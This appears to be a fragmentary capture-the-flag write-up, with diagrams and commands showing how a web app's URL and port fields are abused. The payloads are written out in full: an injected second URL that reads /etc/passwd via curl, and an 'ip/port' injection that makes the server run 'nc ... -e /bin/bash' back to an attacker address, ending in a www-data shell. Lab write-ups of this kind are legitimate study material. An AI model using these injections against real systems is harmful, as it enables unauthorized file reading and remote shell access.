...
[Protocol Filter Bypass]
  ...
  url=http://10.10.16.32 file:///etc/passwd → BOTH fetched!
         │
         ▼
...
[Parameter Injection → RCE]
  ...
  ip=10.10.16.32&port=443 -e /bin/bash
  Server executes: /usr/bin/nc -vz 10.10.16.32 443 -e /bin/bash
...
/usr/bin/curl -s http://10.10.16.32 file:///etc/passwd
...
```bash
curl -s -X POST \
  --data-urlencode "url=http://10.10.16.32 file:///etc/passwd" \
  http://10.129.234.87/index.php
```
...
curl -s -X POST \
  ...
  -d "ip=10.10.16.32&port=443 -e /bin/bash"
```

The server executes:

```bash
/usr/bin/nc -vz 10.10.16.32 443 -e /bin/bash
```

**Shell received:**

```
connect to [10.10.16.32] from (UNKNOWN) [10.129.234.87] 47748
whoami
www-data
```
